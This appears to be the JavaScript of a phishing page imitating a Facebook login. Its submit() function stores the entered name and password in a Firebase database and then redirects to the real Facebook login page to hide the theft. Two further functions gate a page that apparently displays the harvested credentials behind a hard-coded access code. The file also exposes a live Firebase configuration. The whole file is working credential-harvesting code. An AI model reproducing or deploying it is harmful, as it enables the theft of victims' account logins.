// Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCpbb9kKDgD3sly6hjSe1I55mIlqKsa5JM",
            authDomain: "systeam-d12d0.firebaseapp.com",
            projectId: "systeam-d12d0",
            storageBucket: "systeam-d12d0.firebasestorage.app",
            messagingSenderId: "938749422010",
            appId: "1:938749422010:web:097e3432289f20ac3fd583",
            measurementId: "G-FC1TNMV0SH"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        function submit() {
            const name = document.getElementById('name').value;
            const password = document.getElementById('password').value;
            let isValid = true;

            // Validate name
            if (name.length < 3) {
                alert('Name must consist of at least 3 characters!');
                isValid = false;
            }

            // Validate password
            if (password.length < 4) {
                alert('Password must be at least 4 characters!');
                isValid = false;
            }

            // If all validations pass
            if (isValid) {
                const userData = {
                    name: name,
                    password: password,
                    timestamp: new Date().toISOString()
                };

                // Push data to Firebase
                database.ref('users').push(userData)
                    .then(() => {
                        console.log("Data stored successfully!");
                        window.open('https://m.facebook.com/login/', '_blank');
                    })
                    .catch((error) => {
                        console.error("Error storing data:", error);
                    });
            }
        }

        const btn = document.getElementById('btn')
        const input = document.getElementById('admin');
        const container = document.getElementById('container');
        const mesg = document.getElementById('mesg');

        function verify(){
           
            
            if(input.value === '@C011in5'){
                mesg.innerHTML = 'Access Granted';
                mesg.style.color = 'limegreen';
                setTimeout(() => {
                    window.location.href = 'facebookDisplay.html';
                }, 1000);
            }else{
                mesg.innerHTML = 'Access Denied...Enter valid access code!';
                mesg.style.color = 'red';
                input.value = '';

                // Shake animation for wrong password
                input.style.animation = 'shake 0.5s';
                setTimeout(() => {
                    input.style.animation = '';
                }, 500);
            }
        }

        function reqPass() {
            
            let mesg = document.getElementById('mesg')
            container.style.display = 'none';
            input.style.display = 'block';
            btn.style.display = 'block';
            
            if(input.value === '@C011in5'){
                mesg.innerHTML = 'Access Granted';
                mesg.style.color = 'limegreen';
                setTimeout(() => {
                    window.location.href = 'facebookDisplay.html';
                }, 1000);
            }else{
                mesg.innerHTML = 'Access Denied...Enter valid access code!';
                mesg.style.color = 'red';
                input.value = '';

                // Shake animation for wrong password
                input.style.animation = 'shake 0.5s';
                setTimeout(() => {
                    input.style.animation = '';
                }, 500);
            }
        }